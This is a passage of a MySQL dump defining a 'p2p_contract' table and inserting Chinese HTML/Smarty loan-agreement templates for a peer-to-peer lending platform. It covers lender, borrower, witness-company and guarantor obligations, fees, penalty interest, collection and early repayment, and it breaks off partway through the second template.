# Structure for table "p2p_contract"
#

DROP TABLE IF EXISTS `p2p_contract`;
CREATE TABLE `p2p_contract` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL COMMENT '范本标题',
  `content` text NOT NULL COMMENT '范本内容',
  `is_effect` tinyint(1) NOT NULL COMMENT '0无效 1有效',
  `is_delete` tinyint(1) NOT NULL COMMENT '0正常 1删除',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='合同范本';

#
# Data for table "p2p_contract"
#

INSERT INTO `p2p_contract` VALUES (1,'等额本息合同范本【普通】','<div style=\"width: 98%;text-align: right;\">编号：<span>{$deal.deal_sn}</span></div>\n<h2 align=\"center\">借款协议</h2>\n<br/>\n<div style=\"text-align: left;font-weight: 600;\">甲方（出借人）：</div>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n    <tr>\n\t<td style=\"text-align:center;\"> {$SITE_TITLE}用户名</td>\n\t<td style=\"text-align:center;\"> 借出金额</td>\n\t<td style=\"text-align:center;\">借款期限</td>\n\t<td style=\"text-align:center;\"> 每月应收本息</td>\n    </tr>\n    {foreach from=\"$loan_list\" item=\"loan\"}\n    <tr>\n\t<td style=\"text-align:center;\">{$loan.user_name}</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.money f=2}</td>\n\t<td style=\"text-align:center;\">{$deal.repay_time}个月</td>\n\t<td style=\"text-align:right;padding-right:10px\">\n\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.get_repay_money f=2}\n\t</td>\n    </tr>\n    {/foreach}\n    <tr>\n\t<td style=\"text-align:center;\">总计</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.load_money f=2}</td>\n\t<td>?</td>\n\t<td>?</td>\n    </tr>\n</table>\n<p>注：因计算中存在四舍五入，最后一期应收本息与之前略有不同</p>\n<br/>\n<div>\n\t<p style=\"text-align: left;font-weight: 600;\">乙方（借款人）：</p>\n\t<p style=\"text-align: left;font-weight: 600;\">{$SITE_TITLE}用户名：<span>{$deal.user.user_name}</span></p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\"> 丙方（见证人）：{function name=\"app_conf\" v=\"COMPANY\"} </p>\n\t<p style=\"text-align: left;font-weight: 600;\">联系方式：{function name=\"app_conf\" v=\"COMPANY_ADDRESS\"}</p>\n</div>\n<br/>\n<p><strong>鉴于：</strong></p>\n<p>1、丙方是一家在{function name=\"app_conf\" v=\"COMPANY_REG_ADDRESS\"}合法成立并有效存续的有限责任公司，拥有{$SITE_URL} 网站（以下简称“该网站”）的经营权，提供信用咨询，为交易提供信息服务；</p>\n<p>2、乙方已在该网站注册，并承诺其提供给丙方的信息是完全真实的；</p>\n<p>3、甲方承诺对本协议涉及的借款具有完全的支配能力，是其自有闲散资金，为其合法所得；并承诺其提供给丙方的信息是完全真实的；</p>\n<p>4、乙方有借款需求，甲方亦同意借款，双方有意成立借贷关系；</p>\n<br/>\n<p style=\"text-align: left;font-weight: 600;\">各方经协商一致，于<span> {function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}</span>签订如下协议，共同遵照履行：</p>\n<br/>\n<p style=\"text-align: left;font-weight: 600;\"> 第一条 借款基本信息</p>\n<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t<tr>\n\t\t<td width=\"20%\" style=\"padding-left:10px\"> 借款详细用途</td>\n\t\t<td style=\"padding-left:10px\"> {$deal.type_info.name}</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">借款本金数额</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.borrow_amount f=2}（各出借人借款本金数额详见本协议文首表格）\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\"> 月偿还本息数额\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.month_repay_money_format}（因计算中存在四舍五入，最后一期应还金额与之前可能有所不同，为{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.last_month_repay_money f=2}）\n\t\t</td>\n\t</tr>\n\t\n\t<tr>\n\t\t<td style=\"padding-left:10px\"> 还款分期月数\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.repay_time}个月\n\t\t</td>\n\t</tr>\n\t\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t还款日\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t 自{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}起，每月 {function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"d\"}日（24:00前，节假日不顺延）\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\"> 借款期限\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.repay_time}个月，{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}起，至  {function name=\"to_date\" v=\"$deal.end_repay_time\" f=\"Y年m月d日\"}日止\n\t\t</td>\n\t</tr>\n</table>\n<br/>\n<div>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第二条 各方权利和义务\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>甲方的权利和义务</u>\n\t</p>\n\t<p> 1、\t甲方应按合同约定的借款期限起始日期将足额的借款本金支付给乙方。\n\t</p>\n\t<p> 2、\t甲方享有其所出借款项所带来的利息收益。\n\t</p>\n\t<p>3、\t如乙方违约，甲方有权要求丙方提供其已获得的乙方信息，丙方应当提供。\n\t</p>\n\t<p>4、\t无须通知乙方，甲方可以根据自己的意愿进行本协议下其对乙方债权的转让。在甲方的债权转让后，乙方需对债权受让人继续履行本协议下其对甲方的还款义务，不得以未接到债权转让通知为由拒绝履行还款义务。\n\t</p>\n\t<p> 5、\t甲方应主动缴纳由利息所得带来的可能的税费。\n\t</p>\n\t<p>6、\t如乙方实际还款金额少于本协议约定的本金、利息及违约金的，甲方各出借人同意各自按照其于本协议文首约定的借款比例收取还款。\n\t</p>\n\t<p> 7、\t甲方应确保其提供信息和资料的真实性，不得提供虚假信息或隐瞒重要事实。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>乙方权利和义务</u>\n\t</p>\n\t<p> 1、\t乙方必须按期足额向甲方偿还本金和利息。\n\t</p>\n\t<p> 2、    乙方必须按期足额向丙方支付借款管理费用。\n\t</p>\n\t<p>3、\t乙方承诺所借款项不用于任何违法用途。\n\t</p>\n\t<p>4、\t乙方应确保其提供的信息和资料的真实性，不得提供虚假信息或隐瞒重要事实。\n\t</p>\n\t<p>5、\t乙方有权了解其在丙方的信用评审进度及结果。\n\t</p>\n\t<p> 6、\t乙方不得将本协议项下的任何权利义务转让给任何其他方。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>丙方的权利和义务</u>\n\t</p>\n\t<p>1、甲方授权并委托丙方代其收取本协议文首所约定的出借人每月应收本息，代收后按照甲方的要求进行处置，乙方对此表示认可。\n\t</p>\n\t<p>2、甲方授权并委托丙方将其支付的出借本金直接划付至乙方账户，乙方对此表示认可。\n\t</p>\n\t<p> 3、甲、乙双方一致同意，在有必要时，丙方有权代甲方对乙方进行关于本协议借款的违约提醒及催收工作，包括但不限于：电话通知、上门催收提醒、发律师函、对乙方提起诉讼等。甲方在此确认委托丙方为其进行以上工作，并授权丙方可以将此工作委托给本协议外的其他方进行。乙方对前述委托的提醒、催收事项已明确知晓并应积极配合。\n\t</p>\n\t<p>4、丙方有权按月向乙方收取双方约定的借款管理费，并在有必要时对乙方进行违约提醒及催收工作，包括但不限于电话通知、发律师函、对乙方提起诉讼等。丙方有权将此违约提醒及催收工作委托给本协议外的其他方进行。\n\t</p>\n\t<p> 5、丙方接受甲乙双方的委托行为所产生的法律后果由相应委托方承担。如因乙方或甲方或其他方（包括但不限于技术问题）造成的延误或错误，丙方不承担任何责任。\n\t</p>\n\t<p> 6、丙方应对甲方和乙方的信息及本协议内容保密；如任何一方违约，或因相关权力部门要求（包括但不限于法院、仲裁机构、金融监管机构等），丙方有权披露。\n\t</p>\n\t<p>7、丙方根据本协议对乙方进行违约提醒及催收工作时，可在其认为必要时进行上门催收提醒，即丙方派出人员（至少2名）至乙方披露的住所地或经常居住地（联系地址）处催收和进行违约提醒，同时向乙方发送催收通知单，乙方应当签收，乙方不签收的，不影响上门催收提醒的进行。丙方采取上门催收提醒的，乙方应当向丙方支付上门提醒费用，收费标准为每次人民币1000.00元，此外，乙方还应向丙方支付进行上门催收提醒服务的差旅费（包括但不限于交通费、食宿费等）。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第三条 借款管理费及居间服务费\n\t</p>\n\t<p>1、\t在本协议中，“借款管理费”和“居间服务费”是指因丙方为乙方提供信用咨询、评估、还款提醒、账户管理、还款特殊情况沟通、本金保障等系列信用相关服务（统称“信用服务”）而由乙方支付给丙方的报酬。\n\t</p>\n\t<p>2、\t对于丙方向乙方提供的一系列信用服务，乙方同意在借款成功时向丙方支付本协议第一条约定借款本金总额的{function name=\"number_format\" v=$deal.services_fee f=1}%(即人民币<?php echo number_format(floatval($this->_var[\'deal\'][\'services_fee\'])*$this->_var[\'deal\'][\'borrow_amount\']/100,2); ?>元)作为居间服务费，该“居间服务费”由乙方授权并委托丙方在丙方根据本协议规定的“丙方的权利和义务”第2款规定向乙方划付出借本金时从本金中予以扣除，即视为乙方已缴纳。在本协议约定的借款期限内，乙方应每月向丙方支付本协议第一条约定借款本金总额的{$deal.manage_fee}% (即人民币{function name=\"number_format\" v=\"$deal.month_manage_money\" f=2}元)，作为借款管理费用，共需支付{$deal.repay_time}期，共计人民币{function name=\"number_format\" v=\"$deal.all_manage_money\" f=2} 元，借款管理费的缴纳时间与本协议第一条约定的还款日一致。</p>\n\t<p> 本条所称的“借款成功时”系指本协议签署日。</p>\n\t<p> 3、    如乙方和丙方协商一致调整借款管理费和居间服务费时，无需经过甲方同意。 </p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第四条 违约责任\n\t</p>\n\t<p> 1、协议各方均应严格履行合同义务，非经各方协商一致或依照本协议约定，任何一方不得解除本协议。\n\t</p>\n\t<p>2、任何一方违约，违约方应承担因违约使得其他各方产生的费用和损失，包括但不限于调查、诉讼费、律师费等，应由违约方承担。如违约方为乙方的，甲方有权立即解除本协议，并要求乙方立即偿还未偿还的本金、利息、罚息、违约金。此时，乙方还应向丙方支付所有应付的借款管理费。如本协议提前解除时，乙方在{$SITE_URL}网站的账户里有任何余款的，丙方有权按照本协议第四条第3项的清偿顺序将乙方的余款用于清偿，并要求乙方支付因此产生的相关费用。</p>\n\t<p>3、乙方的每期还款均应按照如下顺序清偿：</p>\n\t<p>（1）根据本协议产生的其他全部费用；</p>\n\t<p>（2）本协议第四条第4款约定的罚息； </p>\n\t<p>（3）本协议第四条第5款约定的逾期管理费；</p>\n\t<p>（4）拖欠的利息； </p>\n\t<p>（5）拖欠的本金； </p>\n\t<p>（6）拖欠丙方的借款管理费；\n\t</p>\n\t<p>（7）正常的利息； </p>\n\t<p>（8）正常的本金； </p>\n\t<p>（9）丙方的借款管理费；</p>\n\t<p> 4、乙方应严格履行还款义务，如乙方逾期还款，则应按照下述条款向甲方支付逾期罚息，自逾期开始之后，逾期本金的正常利息停止计算。 </p>\n\t<p>罚息总额 = 逾期本息总额×对应罚息利率×逾期天数；</p>\n</div>\n<div>\n\t<br/>\n\t<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t\t<tr>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t逾期天数\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t1?<?php echo (int)app_conf(\"YZ_IMPSE_DAY\")-1; ?>天\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{function name=\"app_conf\" v=\"YZ_IMPSE_DAY\"}天及以上\n\t\t\t</td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t罚息利率\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{$deal.impose_fee_day1}%\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{$deal.impose_fee_day2}%\n\t\t\t</td>\n\t\t</tr>\n\t</table>\n\t<br/>\n\t<p>\n\t\t5、乙方应严格履行还款义务，如乙方逾期还款，则应按照下述条款向丙方支付逾期管理费：\n\t</p>\n\t<p>\n\t\t逾期管理费总额 = 逾期本息总额×对应逾期管理费率×逾期天数；\n\t</p>\n</div>\n<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t逾期天数\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t1?<?php echo (int)app_conf(\"YZ_IMPSE_DAY\")-1; ?>天\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{function name=\"app_conf\" v=\"YZ_IMPSE_DAY\"}天及以上\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t逾期管理费费率\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.manage_impose_fee_day1}%\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.manage_impose_fee_day2}%\n\t\t</td>\n\t</tr>\n</table>\n<br/>\n<div>\n\t<p>\n\t\t6、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，本协议项下的全部借款本息及借款管理费均提前到期，乙方应立即清偿本协议下尚未偿付的全部本金、利息、罚息、借款管理费及根据本协议产生的其他全部费用。\n\t</p>\n\t<p>\n\t\t7、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，丙方有权将乙方的“逾期记录”记入人民银行公民征信系统，丙方不承担任何法律责任。\n\t</p>\n\t<p>\n\t\t8、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，丙方有权将乙方违约失信的相关信息及乙方其他信息向媒体、用人单位、公安机关、检查机关、法律机关披露，丙方不承担任何责任。\n\t</p>\n\t<p>\n\t\t9、在乙方还清全部本金、利息、借款管理费、罚息、逾期管理费之前，罚息及逾期管理费的计算不停止。\n\t</p>\n\t<p>\n\t\t10、本协议中的所有甲方与乙方之间的借款均是相互独立的，一旦乙方逾期未归还借款本息，甲方中的任何一个出借人均有权单独向乙方追索或者提起诉讼。如乙方逾期支付借款管理费或提供虚假信息的，丙方亦可单独向乙方追索或者提起诉讼。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第五条 提前还款\n\t</p>\n\t<p>\n\t\t1、乙方可在借款期间任何时候提前偿还剩余借款。\n\t</p>\n\t<p>\n\t\t2、提前偿还全部剩余借款\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t1）乙方提前清偿全部剩余借款时，应向甲方支付当期应还本息，剩余本金及提前还款补偿（补偿金额为剩余本金的{$deal.compensate_fee}%）。\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t2）乙方提前清偿全部剩余借款时，应向丙方支付当期借款管理费，乙方无需支付剩余还款期的借款管理费。\n\t</p>\n\t<p>\n\t\t3、提前偿还部分借款\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t1）乙方提前偿还部分借款，仍应向甲方支付全部借款利息。\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t2）乙方提前偿还部分借款，仍应向丙方支付全部应付的借款管理费。\n\t</p>\n\t<p>\n\t\t4、任何形式的提前还款不影响丙方向乙方收取在本协议第三条中说明的居间服务费。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第六条\t法律及争议解决\n\t</p>\n\t <p>\n\t\t 本协议的签订、履行、终止、解释均适用中华人民共和国法律，并由丙方所在地{function name=\"app_conf\" v=\'COMPANY_REG_ADDRESS\'}人民法院管辖。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第七条\t附则\n\t</p>\n\t<p>\n\t\t1、本协议采用电子文本形式制成，并永久保存在丙方为此设立的专用服务器上备查，各方均认可该形式的协议效力。\n\t</p>\n\t<p>\n\t\t2、本协议自文本最终生成之日生效。\n\t</p>\n\t<p>\n\t\t3、本协议签订之日起至借款全部清偿之日止，乙方或甲方有义务在下列信息变更三日内提供更新后的信息给丙方：本人、本人的家庭联系人及紧急联系人、工作单位、居住地址、住所电话、手机号码、电子邮箱、银行账户的变更。若因任何一方不及时提供上述变更信息而带来的损失或额外费用应由该方承担。\n\t</p>\n\t<p>\n\t\t4、如果本协议中的任何一条或多条违反适用的法律法规，则该条将被视为无效，但该无效条款并不影响本协议其他条款的效力。\n\t</p>\n        <br>\n\t{if $deal.attachment}\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第八条\t附件\n\t</p>\n\t<p>\n\t\t{$deal.attachment}\n\t</p>\n\t{/if}\n</div>\n<br/>\n<div style=\"width: 98%;text-align: right;\">\n\t<p>\n\t\t{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}\n\t</p>\n</div>',1,1),(2,'等额本息合同范本【担保】','<div style=\"width: 98%;text-align: right;\">编号：<span>{$deal.deal_sn}</span></div>\n<h2 align=\"center\">借款协议</h2>\n<br/>\n<div style=\"text-align: left;font-weight: 600;\">甲方（出借人）：</div>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n    <tr>\n\t<td style=\"text-align:center;\"> {$SITE_TITLE}用户名</td>\n\t<td style=\"text-align:center;\"> 借出金额</td>\n\t<td style=\"text-align:center;\">借款期限</td>\n\t<td style=\"text-align:center;\"> 每月应收本息</td>\n    </tr>\n    {foreach from=\"$loan_list\" item=\"loan\"}\n    <tr>\n\t<td style=\"text-align:center;\">{$loan.user_name}</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.money f=2}</td>\n\t<td style=\"text-align:center;\">{$deal.repay_time}个月</td>\n\t<td style=\"text-align:right;padding-right:10px\">\n\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.get_repay_money f=2}\n\t</td>\n    </tr>\n    {/foreach}\n    <tr>\n\t<td style=\"text-align:center;\">总计</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.load_money f=2}</td>\n\t<td>?</td>\n\t<td>?</td>\n    </tr>\n</table>\n<p>注：因计算中存在四舍五入，最后一期应收本息与之前略有不同</p>\n<br/>\n<div>\n\t<p style=\"text-align: left;font-weight: 600;\">乙方（借款人）：</p>\n\t<p style=\"text-align: left;font-weight: 600;\">{$SITE_TITLE}用户名：<span>{$deal.user.user_name}</span></p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\"> 丙方（见证人）：{function name=\"app_conf\" v=\"COMPANY\"} </p>\n\t<p style=\"text-align: left;font-weight: 600;\">联系方式：{function name=\"app_conf\" v=\"COMPANY_ADDRESS\"}</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\"> 丁方（担保方）：{$deal.agency_info.name} </p>\n\t<p style=\"text-align: left;font-weight: 600;\">联系方式：{$deal.agency_info.address}</p>\n</div>\n<br/>\n<p><strong>鉴于：</strong></p>\n<p>1、丙方是一家在{function name=\"app_conf\" v=\"COMPANY_REG_ADDRESS\"}合法成立并有效存续的有限责任公司，拥有{$SITE_URL} 网站（以下简称“该网站”）的经营权，提供信用咨询，为交易提供信息服务；</p>\n<p>2、乙方已在该网站注册，并承诺其提供给丙方的信息是完全真实的；</p>\n<p>3、甲方承诺对本协议涉及的借款具有完全的支配能力，是其自有闲散资金，为其合法所得；并承诺其提供给丙方的信息是完全真实的；</p>\n<p>4、乙方有借款需求，甲方亦同意借款，双方有意成立借贷关系；</p>\n<p>5、丁方愿意作为甲方借款提供保障。当乙方逾期3天仍未清偿借款本息，则甲方本协议项下的债权（逾期本息）自动转让给丁方，丁方将在第4天垫付该标的的未清偿借款本息给甲方；</p>\n<br/>\n<p style=\"text-align: left;font-weight: 600;\">各方经协商一致，于<span> {function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}</span>签订如下协议，共同遵照履行：</p>\n<br/>\n<p style=\"text-align: left;font-weight: 600;\"> 第一条 借款基本信息</p>\n<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t<tr>\n\t\t<td width=\"20%\" style=\"padding-left:10px\"> 借款详细用途</td>\n\t\t<td style=\"padding-left:10px\"> {$deal.type_info.name}</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">借款本金数额</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.borrow_amount f=2}（各出借人借款本金数额详见本协议文首表格）\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">月偿还本息数额\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.month_repay_money_format}（因计算中存在四舍五入，最后一期应还金额与之前可能有所不同，为{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.last_month_repay_money f=2}）\n\t\t</td>\n\t</tr>\n\t\n\t<tr>\n\t\t<td style=\"padding-left:10px\"> 还款分期月数\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.repay_time}个月\n\t\t</td>\n\t</tr>\n\t\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t还款日\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t 自{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}起，每月 {function name=\"to_date\" v=\"$deal.end_repay_time\" f=\"Y年m月d日\"}日（24:00前，节假日不顺延）\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\"> 借款期限\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.repay_time}个月，{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}起，至  {function name=\"to_date\" v=\"$deal.end_repay_time\" f=\"Y年m月d日\"}日止\n\t\t</td>\n\t</tr>\n</table>\n<br/>\n<div>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第二条 各方权利和义务\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>甲方的权利和义务</u>\n\t</p>\n\t<p> 1、\t甲方应按合同约定的借款期限起始日期将足额的借款本金支付给乙方。\n\t</p>\n\t<p> 2、\t甲方享有其所出借款项所带来的利息收益。\n\t</p>\n\t<p>3、\t如乙方违约，甲方有权要求丙方提供其已获得的乙方信息，丙方应当提供。\n\t</p>\n\t<p>4、\t无须通知乙方，甲方可以根据自己的意愿进行本协议下其对乙方债权的转让。在甲方的债权转让后，乙方需对债权受让人继续履行本协议下其对甲方的还款义务，不得以未接到债权转让通知为由拒绝履行还款义务。\n\t</p>\n\t<p> 5、\t甲方应主动缴纳由利息所得带来的可能的税费。\n\t</p>\n\t<p>6、\t如乙方实际还款金额少于本协议约定的本金、利息及违约金的，甲方各出借人同意各自按照其于本协议文首约定的借款比例收取还款。\n\t</p>\n\t<p> 7、\t甲方应确保其提供信息和资料的真实性，不得提供虚假信息或隐瞒重要事实。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>乙方权利和义务</u>\n\t</p>\n\t<p> 1、\t乙方必须按期足额向甲方偿还本金和利息。\n\t</p>\n\t<p> 2、    乙方必须按期足额向丙方支付借款管理费用。\n\t</p>\n\t<p>3、\t乙方承诺所借款项不用于任何违法用途。\n\t</p>\n\t<p>4、\t乙方应确保其提供的信息和资料的真实性，不得提供虚假信息或隐瞒重要事实。\n\t</p>\n\t<p>5、\t乙方有权了解其在丙方的信用评审进度及结果。\n\t</p>\n\t<p> 6、\t乙方不得将本协议项下的任何权利义务转让给任何其他方。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>丙方的权利和义务</u>\n\t</p>\n\t<p>1、甲方授权并委托丙方代其收取本协议文首所约定的出借人每月应收本息，代收后按照甲方的要求进行处置，乙方对此表示认可。\n\t</p>\n\t<p>2、甲方授权并委托丙方将其支付的出借本金直接划付至乙方账户，乙方对此表示认可。\n\t</p>\n\t<p> 3、甲、乙双方一致同意，在有必要时，丙方有权代甲方对乙方进行关于本协议借款的违约提醒及催收工作，包括但不限于：电话通知、上门催收提醒、发律师函、对乙方提起诉讼等。甲方在此确认委托丙方为其进行以上工作，并授权丙方可以将此工作委托给本协议外的其他方进行。乙方对前述委托的提醒、催收事项已明确知晓并应积极配合。\n\t</p>\n\t<p>4、丙方有权按月向乙方收取双方约定的借款管理费，并在有必要时对乙方进行违约提醒及催收工作，包括但不限于电话通知、发律师函、对乙方提起诉讼等。丙方有权将此违约提醒及催收工作委托给本协议外的其他方进行。\n\t</p>\n\t<p> 5、丙方接受甲乙双方的委托行为所产生的法律后果由相应委托方承担。如因乙方或甲方或其他方（包括但不限于技术问题）造成的延误或错误，丙方不承担任何责任。\n\t</p>\n\t<p> 6、丙方应对甲方和乙方的信息及本协议内容保密；如任何一方违约，或因相关权力部门要求（包括但不限于法院、仲裁机构、金融监管机构等），丙方有权披露。\n\t</p>\n\t<p>7、丙方根据本协议对乙方进行违约提醒及催收工作时，可在其认为必要时进行上门催收提醒，即丙方派出人员（至少2名）至乙方披露的住所地或经常居住地（联系地址）处催收和进行违约提醒，同时向乙方发送催收通知单，乙方应当签收，乙方不签收的，不影响上门催收提醒的进行。丙方采取上门催收提醒的，乙方应当向丙方支付上门提醒费用，收费标准为每次人民币1000.00元，此外，乙方还应向丙方支付进行上门催收提醒服务的差旅费（包括但不限于交通费、食宿费等）。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>丁方的权利和义务</u>\n\t</p>\n\t<p>1、出借人和借款人均同意，丁方取得出借人在本协议项下的债权后，可依法向借款人追收借款本金、利息、逾期罚息等，清收费用，坏账风险均由丁方承担。\n\t</p>\n\t<p>2、款人逾期本网站对逾期仍未还款的借款人收取逾期罚息作为催收费用、采取多种方式进行催收、将借款人的相关信息对外公开或列入“不良信用记录”或采取法律措施等各项行为，该等服务的法律后果均由借款人自行承担，如债权转让给丁方后，对借款人造成的一切责任与本网站无关，均由借款人自行承担。\n\t</p>\n\t<p> 3、若借款人的任何一期还款不足以偿还应还本金、利息和违约金，且出借人为多人时，则出借人同意按照各自出借金额在出借金额总额中的比例收取还款，不足偿还本金时直接由丁方垫付后债权直接转让给丁方再进行追讨。\n\t</p>\n\t\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第三条 借款管理费及居间服务费\n\t</p>\n\t<p>1、\t在本协议中，“借款管理费”和“居间服务费”是指因丙方为乙方提供信用咨询、评估、还款提醒、账户管理、还款特殊情况沟通、本金保障等系列信用相关服务（统称“信用服务”）而由乙方支付给丙方的报酬。\n\t</p>\n\t<p>2、\t对于丙方向乙方提供的一系列信用服务，乙方同意在借款成功时向丙方支付本协议第一条约定借款本金总额的{function name=\"number_format\" v=$deal.services_fee f=1}%(即人民币<?php echo number_format(floatval($this->_var[\'deal\'][\'services_fee\'])*$this->_var[\'deal\'][\'borrow_amount\']/100,2); ?>元)作为居间服务费，该“居间服务费”由乙方授权并委托丙方在丙方根据本协议规定的“丙方的权利和义务”第2款规定向乙方划付出借本金时从本金中予以扣除，即视为乙方已缴纳。在本协议约定的借款期限内，乙方应每月向丙方支付本协议第一条约定借款本金总额的{$deal.manage_fee}% (即人民币{function name=\"number_format\" v=\"$deal.month_manage_money\" f=2}元)，作为借款管理费用，共需支付{$deal.repay_time}期，共计人民币{function name=\"number_format\" v=\"$deal.all_manage_money\" f=2} 元，借款管理费的缴纳时间与本协议第一条约定的还款日一致。</p>\n\t<p> 本条所称的“借款成功时”系指本协议签署日。</p>\n\t<p> 3、    如乙方和丙方协商一致调整借款管理费和居间服务费时，无需经过甲方同意。 </p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第四条 违约责任\n\t</p>\n\t<p> 